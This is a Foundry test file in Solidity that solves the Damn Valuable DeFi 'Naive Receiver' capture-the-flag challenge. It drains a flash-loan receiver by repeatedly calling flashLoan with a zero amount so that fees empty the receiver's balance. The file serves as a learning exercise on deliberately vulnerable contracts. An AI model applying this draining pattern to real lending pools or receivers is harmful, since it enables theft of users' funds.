// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/1/NaiveReceiverLenderPool.sol";
import "../src/1/FlashLoanReceiver.sol";
import "../src/DamnValuableToken.sol";
import "@openzeppelin/contracts/utils/Address.sol";
contract NaivereceiverTest is Test {
    using Address for address;
    uint TOKENS_IN_POOL = 1000000 ether;
    uint INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;
    DamnValuableToken token;
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiverContract;

    address attacker;
    address someUser;
    function setUp() external {
        attacker = vm.addr(1);
        vm.deal(attacker, 1000 ether);
        // setup contracts
        pool = new NaiveReceiverLenderPool();
        receiverContract = new FlashLoanReceiver(payable(address(pool)));
        (payable(address(receiverContract))).transfer(10 ether);
        
    }
    
    function testComplete() external {
        vm.startPrank(attacker);
        assert(address(receiverContract).balance == 10 ether);
        for(uint i = 0; i < 10; i++){
            pool.flashLoan(address(receiverContract), 0);
        }
        assert(address(receiverContract).balance == 0 ether);
    }
}